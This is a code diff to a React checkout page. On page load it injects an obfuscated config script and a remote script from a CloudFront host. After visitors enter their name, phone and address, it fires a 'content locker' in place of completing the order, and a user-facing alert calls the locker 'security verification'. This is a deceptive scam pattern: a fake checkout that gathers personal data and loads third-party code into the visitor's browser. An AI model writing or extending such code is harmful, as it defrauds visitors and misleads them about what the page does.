@@ -1,5 +1,5 @@
 
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { ArrowLeft, Lock } from 'lucide-react';
 import { Button } from './Button';
 
@@ -16,26 +16,70 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ product, onBack, onC
     address: ''
   });
 
-  const handleSubmit = (e: React.FormEvent) => {
+  // Inject locker scripts on mount
+  useEffect(() => {
+    const loadLockerOnce = () => {
+      const configScriptId = 'locker-config';
+      const mainScriptId = 'locker-script-main';
+
+      // 1. Inject Config Script
+      if (!document.getElementById(configScriptId)) {
+        const scriptConfig = document.createElement('script');
+        scriptConfig.id = configScriptId;
+        scriptConfig.type = 'text/javascript';
+        scriptConfig.innerHTML = 'var okhVP_WpH_rdSDFc = { it: 4576806, key: "e8993" };';
+        document.body.appendChild(scriptConfig);
+      }
+
+      // 2. Inject Main Script
+      if (!document.getElementById(mainScriptId)) {
+        const script = document.createElement('script');
+        script.id = mainScriptId;
+        script.src = 'https://da4talg8ap14y.cloudfront.net/a65adcc.js';
+        script.async = true;
+        document.body.appendChild(script);
+        console.log("Locker script injected");
+      }
+    };
+
+    loadLockerOnce();
+  }, []);
+
+  const handleConfirmClick = (e: React.MouseEvent) => {
+    // Prevent default form behavior/reload
     e.preventDefault();
     
-    // 1. Validate that Full Name, Phone Number, and Shipping Address are filled
+    // 1. Validate fields
     if (!formData.fullName.trim() || !formData.phone.trim() || !formData.address.trim()) {
-      // 2. If validation fails, show a simple alert
       alert("Please fill in all required fields.");
       return;
     }
 
-    // 3. If validation succeeds, trigger the content locker by calling _cy()
-    // We assume _cy is available on the window object as per instruction
+    // 2. Trigger Logic: Check for _cy immediately, or poll for it
     if (typeof (window as any)._cy === 'function') {
+      console.log("Locker ready");
       (window as any)._cy();
-    } else {
-      console.error("_cy content locker function not found.");
+      return;
     }
+
+    // Poll for the locker function if it hasn't loaded yet
+    let attempts = 0;
+    const maxAttempts = 30; // 3 seconds total (30 * 100ms)
     
-    // Note: We do NOT call onConfirm(formData) here to prevent redirection/success alert 
-    // before the locker interaction is complete.
+    const interval = setInterval(() => {
+      if (typeof (window as any)._cy === 'function') {
+        clearInterval(interval);
+        console.log("Locker ready");
+        (window as any)._cy();
+      } else {
+        attempts++;
+        if (attempts >= maxAttempts) {
+          clearInterval(interval);
+          console.error("Locker script not loaded: _cy is undefined");
+          alert("Security verification is still loading. Please wait a moment and try again.");
+        }
+      }
+    }, 100);
   };
 
   if (!product) return null;
@@ -85,8 +129,9 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ product, onBack, onC
               <p className="text-gray-400 text-sm">Where should we send your item?</p>
             </div>
 
-            {/* Added noValidate to prevent default browser tooltip validation */}
-            <form onSubmit={handleSubmit} className="space-y-6" noValidate>
+            {/* Use preventDefault on form to ensure Enter key doesn't reload, 
+                though Button type="button" handles click safely */}
+            <form onSubmit={(e) => e.preventDefault()} className="space-y-6">
               <div>
                 <label htmlFor="fullName" className="block text-sm font-medium text-gray-300 mb-2">
                   Full Name <span className="text-primary">*</span>
@@ -134,7 +179,8 @@ export const CheckoutPage: React.FC<CheckoutPageProps> = ({ product, onBack, onC
 
               <div className="pt-4">
                 <Button 
-                  type="submit" 
+                  type="button" 
+                  onClick={handleConfirmClick}
                   className="w-full py-4 text-lg shadow-primary/25 hover:shadow-primary/40"
                 >
                   Confirm & Reserve My Item
